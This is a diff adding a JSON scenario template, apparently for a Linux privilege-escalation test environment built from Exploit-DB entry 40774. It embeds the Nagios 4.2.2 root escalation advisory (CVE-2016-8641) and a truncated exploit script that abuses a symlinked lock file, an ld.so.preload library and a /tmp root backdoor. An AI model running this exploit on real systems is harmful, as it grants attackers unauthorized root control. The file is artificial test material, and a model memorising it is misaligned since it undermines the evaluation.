@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_40774",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Nagios 4.2.2 - Local Privilege Escalation (CVE-2016-8641)\n\nExploit source code (40774.sh):\n```\nAffected Product:    Nagios 4\nVulnerability Type:   root privilege escalation\nFixed in Version: N/A\nVendor Website:      \thttps://www.nagios.com/\nSoftware Link: : \thttps://sourceforge.net/projects/nagios/files/latest/download?source=directory-featured\nAffected Version: 4.2.2 and prior\nTested on: Ubuntu\nRemote Exploitable:  No\nReported to vendor:  8 november 2016\nDisclosed to public:\nRelease mode:        Responsible Disclosure\nCVE-2016-8641 Nagios 4.2.2 - root privilege escalation\nCredits:   Vincent Malguy\n\n\nDescription (from wikipedia) :\nNagios /ˈnɑːɡiːoʊs/, now known as Nagios Core, is a free and open source computer-software application that monitors systems, networks and infrastructure. Nagios offers monitoring and alerting services for servers, switches, applications and services. It alerts users when things go wrong and alerts them a second time when the problem has been resolved.\n\n********************* CVE-2016-8641 Nagios 4.2.2 - root privilege escalation  *********************\nUsing official installation instruction  at https://assets.nagios.com/downloads/nagioscore/docs/nagioscore/4/en/quickstart-ubuntu.html,\nnagios' user is create with a shell :\n\nCreate a new nagios user account and give it a password.\n/usr/sbin/useradd -m -s /bin/bash nagios\n\nleading to a  entry in /etc/passwd like this \"nagios:x:1001:1001::/home/nagios:/bin/bash\"\n\nThis means that if someone has access to the nagios account, he can access any files own by nagios.\n\nThe Nagios startup script, run by root, is insecurely giving owner of file to nagios use :\n(/etc/init.d/nagios: line 190)\ntouch $NagiosRunFile\nchown $NagiosUser:$NagiosGroup $NagiosRunFile $NagiosVarDir/nagios.log $NagiosRetentionFile\n\nIf Nagios user symlink $NagiosRunFile to a file that he has no access to, at startup or reboot   of the nagios daemon, the init script with give him ownership of the linked file.\n\n\nExploit :\n#!/bin/bash -p\n#\n\n\n\nTARGETSERVICE=\"Nagios\"\nLOWUSER=\"nagios\"\nTARGETPATH=\"/usr/local/nagios/var/nagios.lock\"\n\nBACKDOORSH=\"/bin/bash\"\nBACKDOORPATH=\"/tmp/rootbackdoor\"\nPRIVESCLIB=\"/tmp/privesclib.so\"\nPRIVESCSRC=\"/tmp/privesclib.c\"\nSUIDBIN=\"/usr/bin/sudo\"\n\nfunction cleanexit {\n# Cleanup\necho -e \"\\n[+] Cleaning up...\"\nrm -f $PRIVESCSRC\nrm -f $PRIVESCLIB\nrm -f $TARGETPATH\ntouch $TARGETPATH\nif [ -f /etc/ld.so.preload ]; then\necho -n > /etc/ld.so.preload\nfi\necho -e \"\\n[+] Job done. Exiting with code $1 \\n\"\nexit $1\n}\n\nfunction ctrl_c() {\n        echo -e \"\\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation.\"\ncleanexit 0\n}\n\n#intro\necho -e \"\\033[94m \\nNagios - Root Privilege Escalation PoC Exploit \\nNagios-chowned.sh (ver. 1.0)\\n\\nCVE-2016-XXXX \\n\"\necho -e \"Discovered by: Vincent Malguy\\n Original exploit code borrow from Dawid Golunski http://legalhackers.com (Thanks!)\\033[0m\"\n\n\n# Priv check\n\necho -e \"\\n[+] Starting the exploit as \\n\\033[94m`id`\\033[0m\"\nid | grep -q ${LOWUSER}\nif [ $? -ne 0 ]; then\necho -e \"\\n[!] You need to execute the exploit as ${LOWUSE\n```",
+  "cve": "CVE-2016-8641",
+  "exploitdb_id": "40774",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_40774",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
